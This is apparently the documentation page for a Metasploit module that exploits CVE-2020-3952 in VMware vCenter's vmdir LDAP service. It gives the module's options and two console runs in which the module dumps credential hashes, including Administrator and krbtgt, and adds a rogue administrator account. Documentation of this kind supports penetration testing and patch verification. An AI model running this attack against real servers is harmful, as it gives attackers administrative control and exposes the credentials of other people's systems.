## Vulnerable Application

### Description

This module bypasses LDAP authentication in VMware vCenter Server's
vmdir service to add an arbitrary administrator user. Version 6.7
prior to the 6.7U3f update is vulnerable, only if upgraded from a
previous release line, such as 6.0 or 6.5.
Note that it is also possible to provide a bind username and password to
authenticate if the target is not vulnerable. It will add an arbitrary
administrator user the same way.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Add

Add an admin user to the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.
`dc=vsphere,dc=local` will be used if not set.

### BIND_DN

If you already have a password to authenticate to the LDAP server (see
BIND_PW), this option let you setup the bind username in DN format (e.g
`cn=1.2.3.4,ou=Domain Controllers,dc=vsphere,dc=local`).

### BIND_PW

The password to authenticate to the LDAP server, if you have it.

### USERNAME

Set this to the username for the new admin user.

### PASSWORD

Set this to the password for the new admin user.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi (vulnerable target)

```
msf5 > use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options

Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BASE_DN                    no        LDAP base DN if you already have it
   PASSWORD                   no        Password of admin user to add
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     636              yes       The target port
   SSL       true             no        Enable SSL on the LDAP connection
   USERNAME                   no        Username of admin user to add


Auxiliary action:

   Name  Description
   ----  -----------
   Add   Add an admin user


msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set username msfadmin
username => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set password msfadmin
password => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
[*] Running module against [redacted]
not verifying SSL hostname of LDAPS server '[redacted]:636'

[*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
[*] Discovering base DN automatically
[*] Searching root DSE for base DN
dn: cn=DSE Root
namingcontexts: dc=vsphere,dc=local
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.1
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.2
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.3
supportedcontrol: 1.2.840.113556.1.4.417
supportedcontrol: 1.2.840.113556.1.4.319
supportedldapversion: 3
supportedsaslmechanisms: GSSAPI

[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at [redacted]:636
[+] [redacted]:636 is vulnerable to CVE-2020-3952
[*] Storing LDAP data in loot
[+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002255_default_[redacted]_VMwarevCenterS_975097.txt
[*] Password and lockout policy:
vmwpasswordchangeautounlockintervalsec: [redacted]
vmwpasswordchangefailedattemptintervalsec: [redacted]
vmwpasswordchangemaxfailedattempts: [redacted]
vmwpasswordlifetimedays: [redacted]
vmwpasswordmaxidenticaladjacentchars: [redacted]
vmwpasswordmaxlength: [redacted]
vmwpasswordminalphabeticcount: [redacted]
vmwpasswordminlength: [redacted]
vmwpasswordminlowercasecount: [redacted]
vmwpasswordminnumericcount: [redacted]
vmwpasswordminspecialcharcount: [redacted]
vmwpasswordminuppercasecount: [redacted]
vmwpasswordprohibitedpreviouscount: [redacted]

[+] Credentials found: [redacted]
[snip]
[*] Bypassing LDAP auth in vmdir service at [redacted]:636
[*] Adding admin user msfadmin with password msfadmin
[+] Added user msfadmin, so auth bypass was successful!
[+] Added user msfadmin to admin group
[*] Auxiliary module execution completed
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
```

### VMware vCenter Server 6.7.0.2 virtual appliance on ESXi (not vulnerable target)

```
msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options

Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):

   Name      Current Setting                         Required  Description
   ----      ---------------                         --------  -----------
   BASE_DN   dc=vsphere,dc=local                     no        LDAP base DN if you already have it
   BIND_DN   cn=192.168.3.32,ou=Domain Controlle     no        The username to authenticate to LDAP server
             rs,dc=vsphere,dc=local
   BIND_PW   #$F4!4SeV\BL~L2gb(oa                    no        Password for the BIND_DN
   PASSWORD  NewPassword123#                         no        Password of admin user to add
   RHOSTS    192.168.3.32                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                               /wiki/Using-Metasploit
   RPORT     636                                     yes       The target port
   SSL       true                                    no        Enable SSL on the LDAP connection
   USERNAME  MsfAdmin                                no        Username of admin user to add


Auxiliary action:

   Name  Description
   ----  -----------
   Add   Add an admin user


msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
[*] Running module against 192.168.3.32

[*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
not verifying SSL hostname of LDAPS server '192.168.3.32:636'
[*] User-specified base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at 192.168.3.32:636
[*] Storing LDAP data in loot
[+] Saved LDAP data to /home/msfuser/.msf4/loot/20220112091121_default_192.168.3.32_VMwarevCenterS_063565.txt
[*] Password and lockout policy:
vmwpasswordchangeautounlockintervalsec: 300
vmwpasswordchangefailedattemptintervalsec: 180
vmwpasswordchangemaxfailedattempts: 5
vmwpasswordlifetimedays: 90
vmwpasswordmaxidenticaladjacentchars: 3
vmwpasswordmaxlength: 20
vmwpasswordminalphabeticcount: 2
vmwpasswordminlength: 8
vmwpasswordminlowercasecount: 1
vmwpasswordminnumericcount: 1
vmwpasswordminspecialcharcount: 1
vmwpasswordminuppercasecount: 1
vmwpasswordprohibitedpreviouscount: 5

[+] Credentials found: cn=192.168.3.32,ou=Domain Controllers,dc=vsphere,dc=local:$dynamic_82$95655cbf44635858cd5205e270d0c095b09a3b0420c88240152555b7166111d5066af66d8eb23dbdc8fd7fa82316f35e5ecb7133993318a5b1af8082dfe2899a$HEX$a0e9478dfe575f50655e1be5270a4949
[+] Credentials found: CN=waiter 5782491a-f3fb-4396-92fd-c85a9ecd6f76,cn=users,dc=vsphere,dc=local:$dynamic_82$fc2d53c4da909e23454bd4da49efd6ab2a141c78f3c066ba11ceda7da88603af84fcc8394f651ea786dd8881bbb6de6244802d82cef9733a020c71baf9fe2d50$HEX$55de181bfcc4806c7904bb9372cd1e71
[+] Credentials found: cn=krbtgt/VSPHERE.LOCAL,cn=users,dc=VSPHERE,dc=LOCAL:$dynamic_82$92aaa06a4299c9f91ae005023589df9a3c264c332daa308111fbbb6b289df296f10e9e11c5ecb42e80348887b78033830a4c069c3ef06504818fdf77f30b3932$HEX$93b772cbbe9d2dbc6ece52909df92416
[+] Credentials found: cn=K/M,cn=users,dc=VSPHERE,dc=LOCAL:$dynamic_82$8905aa15c186fdc63943561ae5e51aaf952dc0b0eb9daa4e669f9a77cad4cee941dadf0d7084b9740734991218ef9f5bc8fc729acdba9fe19ada7ab930d8c6b2$HEX$309a74eda966101876f3f9b628f33cee
[+] Credentials found: cn=Administrator,cn=Users,dc=vsphere,dc=local:$dynamic_82$2ae4d52129ba470fd198e4104ad64f8c8e60a2dd560825dfd97a48d0c2777cc863ea365a5f90f3565883b0e1f11ce4461d04dcad359ea5d786a3826012f5b4c6$HEX$2b5ec6876c4c93cad9fb4ff9e8a35930
[+] Credentials found: cn=vmca/192.168.3.32@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$32a90598e8d80b2f6de98b349975c8013810b4deca01c37d0fe8db63dfaa930d0f9627ee5eda9a1ec0334683d0173c017da4b7294fdd80f36820cec6212a8814$HEX$f00b831d12cb5c1f686a9b73d7cb8127
[+] Credentials found: cn=ldap/192.168.3.32@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$a149162f0449f7ec9dfd83b69ac43d14d01fc083136b2d2a5ada43052c4f6aca0c49c8384564498da1dc6ae801e3cb7468f9b09b1636b32982d2d3b889bf562b$HEX$33dc0eca659cec74bd5174604ff13d75
[+] Credentials found: cn=DNS/192.168.3.32@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$a5e78bcf8b5292409ee8c551172a2e96bccb4b41cd06efb111d0c39331260e4142c8ebab62000f4c51e3e90bec471ede5248bc8a27d45145e7a9d7be1a4fa6eb$HEX$39af5d4ce088e1560966e374ec1ea042
[+] Credentials found: cn=host/192.168.3.32@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$4c778c15111c4ff9792eb943beb7dff2be4b7b6e358b3b3b0eeb59be2ca3d6a8fcee55076164f532ef30487a38beef641f486528f33a576aa3d727f499d76ec7$HEX$477f56bdee35b3758204e3326f2f5460
[*] User-specified base DN: dc=vsphere,dc=local
not verifying SSL hostname of LDAPS server '192.168.3.32:636'
[*] Bypassing LDAP auth in vmdir service at 192.168.3.32:636
[*] Adding admin user MsfAdmin with password NewPassword123#
[+] Added user MsfAdmin, so auth bypass was successful!
[+] Added user MsfAdmin to admin group
[*] Auxiliary module execution completed
```
